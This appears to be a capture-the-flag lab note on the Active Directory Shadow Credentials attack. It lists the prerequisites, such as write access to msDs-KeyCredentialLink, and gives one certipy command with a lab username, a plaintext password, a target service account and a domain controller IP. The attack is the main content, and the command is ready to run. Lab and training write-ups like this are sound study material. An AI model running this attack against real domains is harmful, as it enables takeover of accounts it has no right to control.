Prerequisites
1. The target Domain Functional Level must be **Windows Server 2016** or above.
2. The target domain must have at least one Domain Controller running Windows Server 2016 or above.
3. The Domain Controller to use during the attack must have its own certificate and keys (this means either the organization must have AD CS, or a PKI, a CA or something alike).
4. The attacker must have control over an account able to write the `msDs-KeyCredentialLink` attribute of the target user or computer account.

### do it all in one command with `certipy`
```bash
certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc -dc-ip 10.10.11.69

```